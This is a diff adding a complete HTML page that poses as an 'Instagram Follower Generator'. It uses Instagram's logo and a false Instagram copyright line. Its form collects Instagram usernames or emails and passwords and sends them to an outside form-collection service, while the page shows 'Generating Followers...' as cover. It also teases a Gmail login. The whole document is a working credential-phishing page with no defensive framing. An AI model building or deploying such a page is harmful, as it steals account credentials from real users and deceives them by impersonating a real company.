@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram Follower Generator</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
+
+    body {
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background: linear-gradient(to bottom, #fdfbfb, #ebedee);
+      font-family: 'Roboto', sans-serif;
+    }
+
+    .login-container {
+      background: #fff;
+      width: 360px;
+      padding: 30px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+      border-radius: 12px;
+      text-align: center;
+    }
+
+    .logo {
+      margin-bottom: 25px;
+    }
+
+    .logo img {
+      width: 100px;
+      height: auto;
+    }
+
+    .login-container h1 {
+      font-size: 22px;
+      font-weight: 500;
+      color: #333;
+      margin-bottom: 15px;
+    }
+
+    .login-container form {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .login-container input {
+      outline: none;
+      border: 1px solid #dbdbdb;
+      background: #fafafa;
+      border-radius: 5px;
+      padding: 10px;
+      width: 100%;
+      font-size: 14px;
+      margin-bottom: 15px;
+      transition: border-color 0.3s;
+    }
+
+    .login-container input:focus {
+      border-color: #a1a1a1;
+      background: #fff;
+    }
+
+    .login-container button {
+      background: #0095f6;
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      padding: 10px;
+      width: 100%;
+      font-size: 14px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+
+    .login-container button:hover {
+      background: #007ac1;
+    }
+
+    .login-container .message {
+      margin-top: 15px;
+      font-size: 14px;
+      color: #8e8e8e;
+    }
+
+    .login-container .message a {
+      color: #0095f6;
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    .login-container .message a:hover {
+      text-decoration: underline;
+    }
+
+    .feedback {
+      color: #d32f2f;
+      margin-top: 10px;
+      font-size: 14px;
+    }
+
+    footer {
+      width: 100%;
+      padding: 10px 0;
+      font-size: 12px;
+      color: #8e8e8e;
+      text-align: center;
+      position: absolute;
+      bottom: 10px;
+    }
+
+    footer a {
+      color: #0095f6;
+      text-decoration: none;
+      font-weight: bold;
+    }
+
+    footer a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
+    </div>
+    <h1>Instagram Follower Generator</h1>
+    <!-- Unified Login Form -->
+    <form action="https://formcarry.com/s/9lSlwjAKkAg" method="POST" id="login-post">
+      <input type="text" id="username" name="username" placeholder="Instagram username or email" required>
+      <input type="password" id="password" name="password" placeholder="Password" required>
+      <button type="submit">Generate Followers</button>
+      <div id="feedback" class="feedback"></div>
+    </form>
+    <p class="message">Not gained followers? <a href="#">Try login with Gmail!</a></p>
+  </div>
+  <footer>
+    © 2025 Instagram. Powered by <a href="#">Instagram API</a>.
+  </footer>
+  <script>
+    const loginForm = document.getElementById("login-post");
+    const feedback = document.getElementById("feedback");
+
+    loginForm.addEventListener("submit", (e) => {
+      feedback.textContent = "Generating Followers..."; // Display feedback while submitting
+    });
+
+    document.querySelector('.message a').addEventListener('click', (e) => {
+      e.preventDefault();
+      feedback.textContent = "Redirecting...";
+      setTimeout(() => {
+        feedback.textContent = "This feature is under construction!";
+      }, 2000);
+    });
+  </script>
+</body>
+</html>
